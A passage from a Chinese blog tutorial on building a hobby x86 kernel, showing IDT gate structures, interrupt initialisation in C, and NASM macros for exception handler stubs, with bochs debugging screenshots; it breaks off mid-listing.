plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">#endif /* CONFIG_X86_VOYAGER */</span><br><span class="line"># set up gdt and idt</span><br><span class="line">lidtidt_48# load idt with 0,0</span><br><span class="line">xorl%eax, %eax# Compute gdt_base</span><br><span class="line">movw%ds, %ax# (Convert %ds:gdt to a linear ptr)</span><br><span class="line">shll$4, %eax</span><br><span class="line">addl$gdt, %eax</span><br><span class="line">movl%eax, (gdt_48+2)</span><br><span class="line">lgdtgdt_48# load gdt with whatever is</span><br><span class="line"># appropriate</span><br><span class="line"></span><br><span class="line"># make sure any possible coprocessor is properly reset..</span><br><span class="line">xorw%ax, %ax</span><br><span class="line">outb%al, $0xf0</span><br><span class="line">calldelay</span><br><span class="line"></span><br><span class="line">outb%al, $0xf1</span><br><span class="line">calldelay</span><br><span class="line"></span><br><span class="line"># well, that went ok, I hope. Now we mask all interrupts - the rest</span><br><span class="line"># is done in init_IRQ().</span><br><span class="line">movb$0xFF, %al# mask all interrupts for now</span><br><span class="line">outb%al, $0xA1</span><br><span class="line">calldelay</span><br><span class="line"></span><br><span class="line">movb$0xFB, %al# mask all irq&#x27;s but irq2 which</span><br><span class="line">outb%al, $0x21# is cascaded</span><br></pre></td></tr></table></figure><ul><li>lgdt：加载全局描述符</li><li>lidt：加载中断描述符</li></ul><p>中断描述符结构体</p><p><a href="https://elixir.bootlin.com/linux/v5.17-rc7/source">/</a><a href="https://elixir.bootlin.com/linux/v5.17-rc7/source/arch">arch</a>/<a href="https://elixir.bootlin.com/linux/v5.17-rc7/source/arch/x86">x86</a>/<a href="https://elixir.bootlin.com/linux/v5.17-rc7/source/arch/x86/kernel">kernel</a>/<a href="https://elixir.bootlin.com/linux/v5.17-rc7/source/arch/x86/kernel/idt.c">idt.c</a></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">gate_struct</span> &#123;</span></span><br><span class="line">u16offset_low;</span><br><span class="line">u16segment;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">idt_bits</span><span class="title">bits</span>;</span></span><br><span class="line">u16offset_middle;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_X86_64</span></span><br><span class="line">u32offset_high;</span><br><span class="line">u32reserved;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125; __attribute__((packed));</span><br></pre></td></tr></table></figure><p>至于最下面的<code>offset_high</code>和<code>reserved</code>都是留给x86_64的，所以我们可以定义如下结构体</p><p><code>src/include/xsys/interrupt.h</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifndef</span> XSYS_INTERRUPT_H</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> XSYS_INTERRUPT_H</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;xsys/types.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IDT_SIZE 256</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">gate_t</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    u16 offset0;    <span class="comment">// 段内偏移 0 ~ 15 位</span></span><br><span class="line">    u16 selector;   <span class="comment">// 代码段选择子</span></span><br><span class="line">    u8 reserved;    <span class="comment">// 保留不用</span></span><br><span class="line">    u8 type : <span class="number">4</span>;    <span class="comment">// 任务门/中断门/陷阱门</span></span><br><span class="line">    u8 segment : <span class="number">1</span>; <span class="comment">// segment = 0 表示系统段</span></span><br><span class="line">    u8 DPL : <span class="number">2</span>;     <span class="comment">// 使用 int 指令访问的最低权限</span></span><br><span class="line">    u8 present : <span class="number">1</span>; <span class="comment">// 是否有效</span></span><br><span class="line">    u16 offset1;    <span class="comment">// 段内偏移 16 ~ 31 位</span></span><br><span class="line">&#125; _packed <span class="type">gate_t</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">interrupt_init</span><span class="params">()</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure><p>之后就是初始化idt</p><p><code>src/kernel/interrupt.c</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">interrupt_init</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; IDT_SIZE; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">gate_t</span> *gate = &amp;idt[i];</span><br><span class="line"></span><br><span class="line">        gate-&gt;offset0 = (u32)interrupt_handler &amp; <span class="number">0xffff</span>;</span><br><span class="line">        gate-&gt;offset1 = ((u32)interrupt_handler &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xffff</span>;</span><br><span class="line">        gate-&gt;selector = <span class="number">1</span> &lt;&lt; <span class="number">3</span>; <span class="comment">// 代码段</span></span><br><span class="line">        gate-&gt;reserved = <span class="number">0</span>;      <span class="comment">// 保留不用</span></span><br><span class="line">        gate-&gt;type = <span class="number">0b1110</span>;     <span class="comment">// 中断门</span></span><br><span class="line">        gate-&gt;segment = <span class="number">0</span>;       <span class="comment">// 系统段</span></span><br><span class="line">        gate-&gt;DPL = <span class="number">0</span>;           <span class="comment">// 内核态</span></span><br><span class="line">        gate-&gt;present = <span class="number">1</span>;       <span class="comment">// 有效</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    idt_ptr.base = (u32)idt;</span><br><span class="line">    idt_ptr.limit = <span class="keyword">sizeof</span>(idt) - <span class="number">1</span>;</span><br><span class="line">    BMB;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">asm</span> <span class="title function_">volatile</span><span class="params">(<span class="string">&quot;lidt idt_ptr\n&quot;</span>)</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>gate-&gt;type</code></p><ul><li>0b0101 - 任务门 (Task Gate)：很复杂，而且很低效 x64 就去掉了这种门</li><li>0b1110 - <strong>中断门</strong> (Interrupt Gate) <code>IF</code> 位自动置为 0</li><li>0b1111 - 陷阱门 (Trap Gate)</li></ul><p>同时模仿linux，有中断处理函数入口的程序</p><p><code>src/kernel/handler.asm</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">[bits 32]</span><br><span class="line">; 中断处理函数入口 </span><br><span class="line"></span><br><span class="line">section .text</span><br><span class="line"></span><br><span class="line">extern printk</span><br><span class="line"></span><br><span class="line">global interrupt_handler</span><br><span class="line">interrupt_handler:</span><br><span class="line">    xchg bx, bx</span><br><span class="line">    push message</span><br><span class="line">    call printk</span><br><span class="line">    add esp, 4</span><br><span class="line"></span><br><span class="line">    xchg bx, bx</span><br><span class="line">    iret</span><br><span class="line"></span><br><span class="line">section .data</span><br><span class="line">message:</span><br><span class="line">    db &quot;interrput test&quot;,10,0</span><br></pre></td></tr></table></figure><p>我们可以创建255个系统中断，即255个IDT，使用bochs调试一下</p><img src="https://img.joe1sn.top/uploads/big/20ab8c0534f31a69adb1ef3e16237537.png" alt="image-20220313194615258" style="zoom:67%;" /><p><img src="https://img.joe1sn.top/uploads/big/890281ea6b2a238fd17ddd4fb81ed4f3.png" alt="image-20220314161529157" /></p><p>而idt的地址：0x10900就是<code>interrupt_handler</code></p><p><img src="https://img.joe1sn.top/uploads/big/f4a92a0c883d3de7d2dd63702beeb297.png" alt="image-20220314161644636" /></p><p>最后也被成功执行了</p><p><img src="https://img.joe1sn.top/uploads/big/6aabfdfbbd5a3b457c9576583f8d4462.png" alt="image-20220314161852144" /></p><h2 id="参考-4"><a class="markdownIt-Anchor" href="#参考-4"></a> 参考</h2><p><a href="https://www.cnblogs.com/LittleHann/p/3871630.html">https://www.cnblogs.com/LittleHann/p/3871630.html</a></p><p><a href="https://en.wikipedia.org/wiki/Interrupt_vector_table">https://en.wikipedia.org/wiki/Interrupt_vector_table</a></p><h1 id="操作系统实现-异常"><a class="markdownIt-Anchor" href="#操作系统实现-异常"></a> 操作系统实现-异常</h1><h2 id="简单实现"><a class="markdownIt-Anchor" href="#简单实现"></a> 简单实现</h2><p><strong>异常</strong></p><ul><li>故障</li><li>陷阱</li><li>终止</li></ul><p><strong>故障 Fault</strong></p><ul><li>这种错误是可以被修复的一种类型，属于最轻的一种异常；</li></ul><p><strong>陷阱 Trap</strong></p><ul><li>此异常通常用于调试</li></ul><p><strong>终止 Abort</strong></p><ul><li>是最严重的异常类型，一旦出现由于 错误无法修复，程序将无法继续运行</li></ul><p>每个一场都需要一个中断，所以有30个中断，用到汇编宏(marco)去处理</p><p><code>src/kernel/handler.asm</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br></pre></td><td class="code"><pre><span class="line">[bits 32]</span><br><span class="line">; 中断处理函数入口 </span><br><span class="line"></span><br><span class="line">extern handler_table</span><br><span class="line"></span><br><span class="line">section .text</span><br><span class="line"></span><br><span class="line">%macro INTERRUPT_HANDLER 2</span><br><span class="line">interrupt_handler_%1:</span><br><span class="line">    xchg bx, bx</span><br><span class="line">%ifn %2</span><br><span class="line">    push 0x20222202</span><br><span class="line">%endif</span><br><span class="line">    push %1; 压入中断向量，跳转到中断入口</span><br><span class="line">    jmp interrupt_entry</span><br><span class="line">%endmacro</span><br><span class="line"></span><br><span class="line">interrupt_entry:</span><br><span class="line"></span><br><span class="line">    ; 保存上文寄存器信息</span><br><span class="line">    push ds</span><br><span class="line">    push es</span><br><span class="line">    push fs</span><br><span class="line">    push gs</span><br><span class="line">    pusha</span><br><span class="line"></span><br><span class="line">    ; 找到前面 push %1 压入的 中断向量</span><br><span class="line">    mov eax, [esp + 12 * 4]</span><br><span class="line"></span><br><span class="line">    ; 向中断处理函数传递参数</span><br><span class="line">    push eax</span><br><span class="line"></span><br><span class="line">    ; 调用中断处理函数，handler_table 中存储了中断处理函数的指针</span><br><span class="line">    call [handler_table + eax * 4]</span><br><span class="line"></span><br><span class="line">    ; 对应 push eax，调用结束恢复栈</span><br><span class="line">    add esp, 4</span><br><span class="line"></span><br><span class="line">    ; 恢复下文寄存器信息</span><br><span class="line">    popa</span><br><span class="line">    pop gs</span><br><span class="line">    pop fs</span><br><span class="line">    pop es</span><br><span class="line">    pop ds</span><br><span class="line"></span><br><span class="line">    ; 对应 push %1</span><br><span class="line">    ; 对应 error code 或 push magic</span><br><span class="line">    add esp, 8</span><br><span class="line">    iret</span><br><span class="line"></span><br><span class="line">INTERRUPT_HANDLER 0x00, 0; divide by zero</span><br><span class="line">INTERRUPT_HANDLER 0x01, 0; debug</span><br><span class="line">INTERRUPT_HANDLER 0x02, 0; non maskable interrupt</span><br><span class="line">INTERRUPT_HANDLER 0x03, 0; breakpoint</span><br><span class="line"></span><br><span class="line">INTERRUPT_HANDLER 0x04, 0; overflow</span><br><span class="line">INTERRUPT_HANDLER 0x05, 0; bound range exceeded</span><br><span class="line">INTERRUPT_HANDLER 0x06, 0; invalid opcode</span><br><span class="line">INTERRUPT_HANDLER 0x07, 0; device not avilable</span><br><span class="line"></span><br><span class="line">INTERRUPT_HANDLER 0x08, 1; double fault</span><br><span class="line">INTERRUPT_HANDLER 0x09, 0; coprocessor segment overrun</span><br><span class="line">INTERRUPT_HANDLER 0x0a, 1; invalid TSS</span><br><span class="line">INTERRUPT_HANDLER 0x0b, 1; segment not present</span><br><span class="line"></span><br><span class="line">INTERRUPT_HANDLER 0x0c, 1; stack segment fault</span><br><span class="line">INTERRUPT_HANDLER 0x0d, 1; general protection fault</span><br><span class="line">INTERRUPT_HANDLER 0x0e, 1; page fault</span><br><span class="line">INTERRUPT_HANDLER 0x0f, 0; reserved</span><br><span class="line"></span><br><span class="line">INTERRUPT_HANDLER 0x10, 0; x87 floating point exception</span><br><span class="line">INTERRUPT_HANDLER 0x11, 1; alignment check</span><br><span class="line">INTERRUPT_HANDLER 0x12, 0; machine check</span><br><span class="line">INTERRUPT_HANDLER 0x13, 0; SIMD Floating - Point Exception</span><br><span class="line"></span><br><span class="line">INTERRUPT_HANDLER 0x14, 0; Virtualization Exception</span><br><span class="line">INTERRUPT_HANDLER 0x15, 1; Control Protection Exception</span><br><span class="line">INTERRUPT_HANDLER 0x16, 0; reserved</span><br><span class="line">INTERRUPT_HANDLER 0x17, 0; reserved</span><br><span class="line"></span><br><span class="line">INTERRUPT_HANDLER 0x18, 0; reserved</span><br><span class="line">INTERRUPT_HANDLER 0x19, 0; reserved</span><br><span class="line">INTERRUPT_HANDLER 0x1a, 0; reserved</span><br><span class="line">INTERRUPT_HANDLER 0x1b, 0; reserved</span><br><span class="line"></span><br><span class="line">INTERRUPT_HANDLER 0x1c, 0; reserved</span><br><span class="line">INTERRUPT_HANDLER 0x1d, 0; reserved</span><br><span class="line">INTERRUPT_HANDLER 0x1e, 0; reserved</span><br><span class="line">INTERRUPT_HANDLER 0x1f, 0; reserved</span><br><span class="line"></span><br><span class="line">INTERRUPT_HANDLER 0x20, 0; clock 时钟中断</span><br><span class="line">INTERRUPT_HANDLER 0x21, 0</span><br><span class="line">INTERRUPT_HANDLER 0x22, 0</span><br><span class="line">INTERRUPT_HANDLER 0x23, 0</span><br><span class="line">INTERRUPT_HANDLER 0x24, 0</span><br><span class="line">INTERRUPT_HANDLER 0x25, 0</span><br><span class="line">INTERRUPT_HANDLER 0x26, 0</span><br><span class="line">INTERRUPT_HANDLER 0x27, 0</span><br><span class="line">INTERRUPT_HANDLER 0x28, 0</span><br><span class="line">INTERRUPT_HANDLER 0x29, 0</span><br><span class="line">INTERRUPT_HANDLER 0x2a, 0</span><br><span class="line">INTERRUPT_HANDLER 0x2b, 0</span><br><span class="line">INTERRUPT_HANDLER 0x2c, 0</span><br><span class="line">INTERRUPT_HANDLER 0x2d, 0</span><br><span class="line">INTERRUPT_HANDLER 0x2e, 0</span><br><span class="line">INTERRUPT_HANDLER 0x2f, 0</span><br><span class="line"></span><br><span class="line">; 下面的数组记录了每个中断入口函数的指针</span><br><span class="line">section .data</span><br><span class="line">global handler_entry_table</span><br><span class="line">handler_entry_table:</span><br><span class="line">    dd interrupt_handler_0x00</span><br><span class="line">    dd interrupt_handler_0x01</span><br><span class="line">    dd interrupt_handler_0x02</span><br><span class="line">    dd interrupt_handler_0x03</span><br><span class="line">    dd interrupt_handler_0x04</span><br><span class="line">    dd interrupt_handler_0x05</span><br><span class="line">    dd interrupt_handler_0x06</span><br><span class="line">    dd interrupt_handler_0x07</span><br><span class="line">    dd interrupt_handler_0x08</span><br><span class="line">    dd interrupt_handler_0x09</span><br><span class="line">    dd interrupt_handler_0x0a</span><br><span class="line">    dd interrupt_handler_0x0b</span><br><span class="line">    dd interrupt_handler_0x0c</span><br><span class="line">    dd interrupt_handler_0x0d</span><br><span class="line">    dd interrupt_handler_0x0e</span><br><span class="line">    dd interrupt_handler_0x0f</span><br><span class="line">    dd interrupt_handler_0x10</span><br><span class="line">    dd interrupt_handler_0x11</span><br><span class="line">    dd interrupt_handler_0x12</span><br><span class="line">    dd interrupt_handler_0x13</span><br><span class="line">    dd interrupt_handler_0x14</span><br><span class="line">    dd interrupt_handler_0x15</span><br><span class="line">    dd interrupt_handler_0x16</span><br><span class="line">    dd interrupt_handler_0x17</span><br><span class="line">    dd interrupt_handler_0x18</span><br><span class="line">    dd interrupt_handler_0x19</span><br><span class="line">    dd interrupt_handler_0x1a</span><br><span class="line">    dd interrupt_handler_0x1b</span><br><span class="line">    dd interrupt_handler_0x1c</span><br><span class="line">    dd interrupt_handler_0x1d</span><br><span class="line">    dd interrupt_handler_0x1e</span><br><span class="line">    dd interrupt_handler_0x1f</span><br><span class="line">    dd interrupt_handler_0x20</span><br><span class="line">    dd interrupt_handler_0x21</span><br><span class="line">    dd interrupt_handler_0x22</span><br><span class="line">    dd interrupt_handler_0x23</span><br><span class="line">    dd interrupt_handler_0x24</span><br><span class="line">    dd interrupt_handler_0x25</span><br><span class="line">    dd interrupt_handler_0x26</span><br><span class="line">    dd interrupt_handler_0x27</span><br><span class="line">    dd interrupt_handler_0x28</span><br><span class="line">    dd interrupt_handler_0x29</span><br><span class="line">    dd interrupt_handler_0x2a</span><br><span class="line">    dd interrupt_handler_0x2b</span><br><span class="line">    dd interrupt_handler_0x2c</span><br><span class="line">    dd interrupt_handler_0x2d</span><br><span class="line">    dd interrupt_handler_0x2e</span><br><span class="line">    dd interrupt_handler_0x2f</span><br></pre></td></tr></table></figure><p><code>src/include/xsys/interrupt.h</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifndef</span> XSYS_INTERRUPT_H</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> XSYS_INTERRUPT_H</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;xsys/types.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IDT_SIZE 256</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">gate_t</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    u16 offset0;    <span class="comment">// 段内偏移 0 ~ 15 位</span></span><br><span class="line">    u16 selector;   <span class="comment">// 代码段选择子</span></span><br><span class="line">    u8 reserved;    <span class="comment">// 保留不用</span></span><br><span class="line">    u8 type : <span class="number">4</span>;    <span class="comment">// 任务门/中断门/陷阱门</span></span><br><span class="line">    u8 segment : <span class="number">1</span>; <span class="comment">// segment = 0 表示系统段</span></span><br><span class="line">    u8 DPL : <span class="number">2</span>;     <span class="comment">// 使用 int 指令访问的最低权限</span></span><br><span class="line">    u8 present : <span class="number">1</span>; <span class="comment">// 是否有效</span></span><br><span class="line">    u16 offset1;    <span class="comment">// 段内偏移 16 ~ 31 位</span></span><br><span class="line">&#125; _packed <span class="type">gate_t</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="type">void</span> *<span class="type">handler_t</span>; <span class="comment">// 中断处理函数</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">interrupt_init</span><span class="params">()</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure><p><code>src/kernel/interrupt.c</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;xsys/interrupt.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;xsys/global.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;xsys/debug.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;xsys/printk.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;xsys/io.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;xsys/assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> LOGK(fmt, args...) DEBUGK(fmt, ##args)</span></span><br><span class="line"><span class="comment">// #define LOGK(fmt, args...)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ENTRY_SIZE 0x30</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PIC_M_CTRL 0x20 <span class="comment">// 主片的控制端口</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PIC_M_DATA 0x21 <span class="comment">// 主片的数据端口</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PIC_S_CTRL 0xa0 <span class="comment">// 从片的控制端口</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PIC_S_DATA 0xa1 <span class="comment">// 从片的数据端口</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PIC_EOI 0x20    <span class="comment">// 通知中断控制器中断结束</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">gate_t</span> idt[IDT_SIZE];</span><br><span class="line"><span class="type">pointer_t</span> idt_ptr;</span><br><span class="line"></span><br><span class="line"><span class="type">handler_t</span> handler_table[IDT_SIZE];</span><br><span class="line"><span class="keyword">extern</span> <span class="type">handler_t</span> handler_entry_table[ENTRY_SIZE];</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">char</span> *messages[] = &#123;</span><br><span class="line">    <span class="string">&quot;#DE Divide Error\0&quot;</span>,</span><br><span class="line">    <span class="string">&quot;#DB RESERVED\0&quot;</span>,</span><br><span class="line">    <span class="string">&quot;--  NMI Interrupt\0&quot;</span>,</span><br><span class="line">    <span class="string">&quot;#BP Breakpoint\0&quot;</span>,</span><br><span class="line">    <span class="string">&quot;#OF Overflow\0&quot;</span>,</span><br><span class="line">    <span class="string">&quot;#BR BOUND Range Exceeded\0&quot;</span>,</span><br><span class="line">    <span class="string">&quot;#UD Invalid Opcode (Undefined Opcode)\0&quot;</span>,</span><br><span class="line">    <span class="string">&quot;#NM Device Not Available (No Math Coprocessor)\0&quot;</span>,</span><br><span class="line">    <span class="string">&quot;#DF Double 